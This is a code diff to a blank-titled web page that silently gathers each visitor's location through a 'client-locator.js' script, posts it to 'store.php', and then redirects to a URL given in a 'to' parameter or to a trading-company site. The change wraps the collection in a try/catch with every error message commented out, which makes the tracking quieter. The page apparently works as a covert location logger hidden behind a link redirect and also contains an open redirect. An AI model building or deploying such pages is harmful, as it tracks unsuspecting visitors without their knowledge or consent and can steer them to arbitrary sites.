@@ -5,6 +5,7 @@
     <title></title>
   </head>
   <body>
+    <pre id="error"></pre>
     <script src="client-locator.js"></script>
     <script>
       const urlParams = new URLSearchParams(window.location.search);
@@ -18,6 +19,7 @@
       }
 
       (async () => {
+        try {
           const clientLocationInfo = await getClientLocationInfo();
 
           await fetch('store.php', {
@@ -27,13 +29,18 @@
             },
             body: JSON.stringify(clientLocationInfo),
           });
+        } 
+        catch (error) {
+          //console.error(error);
+          //document.getElementById('error').innerHTML = error.message;
+        }
 
-          if(to){
-            window.location.href = ensureHttp(to);
-          }
-          else {
-            window.location.href = "https://www.aljamili-trading.com";
-          } 
+        if(to){
+          window.location.href = ensureHttp(to);
+        }
+        else {
+          window.location.href = "https://www.aljamili-trading.com";
+        }
       })();
     </script>
   </body>
